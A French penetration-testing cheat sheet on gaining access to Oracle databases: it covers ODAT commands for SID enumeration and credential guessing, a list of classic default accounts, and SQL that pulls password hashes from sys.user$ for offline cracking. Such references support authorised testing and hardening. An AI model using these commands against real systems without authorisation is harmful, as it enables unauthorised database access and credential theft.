---
title: "Accès et énumération Oracle : TNS, SID et comptes par défaut"
description: "Énumérer le listener TNS d'Oracle et ses SID, tester les nombreux comptes Oracle par défaut et faibles, et extraire les informations de schéma et les empreintes de mots de passe une fois une session de base de données établie."
keywords:
  - TNS listener
  - SID enumeration
  - default credentials
  - sys.user$
  - ODAT
---

# Accès et énumération

L'accès à Oracle est un problème en deux étapes : trouver d'abord un **SID** valide derrière le listener TNS, puis trouver un compte qui fonctionne contre celui-ci. Les deux sont automatisés par `odat`, et les identifiants par défaut font réussir la seconde étape bien plus souvent qu'elle ne le devrait.

## Énumération du listener et des SID

```bash
# Comprehensive scan: listener info, SID guessing, credential testing
odat all -s <target> -p 1521

# Just enumerate SIDs (brute and version-based)
odat sidguesser -s <target> -p 1521
```

## Comptes par défaut et faibles

Oracle est livré avec une longue liste de comptes par défaut, et beaucoup survivent dans la nature :

```bash
# Guess credentials against a known SID (default account list + wordlists)
odat passwordguesser -s <target> -p 1521 -d <SID> --accounts-file accounts.txt
```

```text
# Classic defaults worth trying first
SYSTEM/manager   SYS/change_on_install   SCOTT/tiger   DBSNMP/dbsnmp   OUTLN/outln
```

## Énumération post-authentification

```sql
-- with a session (sqlplus user/pass@//target/SID)
SELECT * FROM user_role_privs;                 -- my roles (DBA?)
SELECT name, password, spare4 FROM sys.user$;  -- password hashes (needs privilege)
SELECT * FROM session_privs;                   -- my system privileges
```

## Notes d'exploitation

- Un SID valide est le prérequis de tout le reste, donc exécutez `sidguesser` en premier ; un SID erroné ou manquant rend les tests d'identifiants dénués de sens.
- **DBA** ou un rôle avec `CREATE PROCEDURE`/`CREATE ANY ...` est la porte vers l'[exécution de commandes](command-execution.md) ; vérifiez `user_role_privs` immédiatement.
- Les empreintes de `sys.user$` (et les valeurs SHA `spare4` en 11g+) se cassent hors ligne, étendant l'accès à d'autres instances où les comptes sont réutilisés.
- Les comptes par défaut d'Oracle constituent le point d'ancrage le plus fiable, donc épuisez la liste par défaut avant un brute force plus poussé.

## Outils

- **ODAT** (`all`, `sidguesser`, `passwordguesser`) : énumération de bout en bout du listener, des SID et des identifiants.
- **sqlplus / python-oracledb** : session authentifiée pour l'extraction du schéma et des empreintes.
- **nmap `oracle-sid-brute`** : énumération alternative des SID.

## Références

- [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
- [HackTricks: pentesting Oracle TNS](https://hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/index.html)
- [Oracle: default user accounts](https://docs.oracle.com/en/database/oracle/oracle-database/19/dbseg/keeping-your-oracle-database-secure.html)
